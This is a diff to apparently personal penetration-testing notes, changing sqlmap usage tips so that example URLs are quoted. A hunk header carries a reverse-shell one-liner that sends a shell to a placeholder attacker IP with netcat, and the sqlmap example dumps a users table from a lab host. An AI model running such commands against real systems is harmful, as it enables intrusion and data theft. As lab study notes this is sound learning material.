@@ -1760,7 +1760,7 @@ busybox nc ATTACKER_IP 443 -e sh
 
 Basic syntax: **sqlmap -u [GET_URL] [flags]**
 
-Note: GET URLs can be taken from Developer Tools -> Network after sending a sample POST request.
+Note: GET URLs can be taken from Developer Tools -> Network after sending a sample POST request; add ' ' to URLs to handle special characters (e.g. ?)
 
 Some key information flags to take note of:
 + **--help** - lists all available flags
@@ -1773,4 +1773,4 @@ Main SQLi flags include:
 + **-T [table_name]** - select a specific table
 + **--dump** - extract all records
 
-E.g. sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
+E.g. sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' -D users -T thomas --dump
